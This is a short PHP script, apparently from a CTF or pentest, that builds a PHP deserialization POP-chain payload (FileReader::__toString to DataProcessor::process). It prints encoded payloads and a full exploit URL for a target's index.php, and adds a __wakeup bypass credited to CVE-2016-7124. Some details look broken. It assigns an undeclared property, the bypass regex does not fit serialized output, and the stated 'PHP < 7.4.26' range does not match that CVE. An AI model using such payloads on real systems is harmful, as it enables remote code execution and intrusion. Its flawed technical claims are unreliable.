<?php
/**
 * POP Chain Exploit Payload
 * 链路: FileReader::__toString -> DataProcessor::process
 */

// === 类定义 (复制目标的类结构) ===
class FileReader {
    public $filename;
    public $content;
}

class DataProcessor {
    public $data;
    public $processor;
}

// === 构造利用链 ===

// DataProcessor 对象
$callbackObj = new DataProcessor();

// 入口对象: FileReader
$exploit = new FileReader();
$exploit->read = [$callbackObj, 'process'];  // 数组Callable: 调用 DataProcessor::process()

// === 生成 Payload ===
$payload = serialize($exploit);
echo "Payload (raw):\n" . $payload . "\n\n";
echo "Payload (URL encoded):\n" . urlencode($payload) . "\n\n";
echo "Payload (Base64):\n" . base64_encode($payload) . "\n\n";

// === 完整利用 URL ===
echo "利用URL:\n" . "http://target/index.php?data=" . urlencode($payload) . "\n\n";

// === 绕过 __wakeup (CVE-2016-7124, PHP < 7.4.26) ===
$payload_bypass = $payload;
$payload_bypass = preg_replace('/DataProcessor:(\d+):/', 'DataProcessor:' . ('\$1' + 1) . ':', $payload_bypass);
echo "Payload (bypass __wakeup):\n" . urlencode($payload_bypass) . "\n";
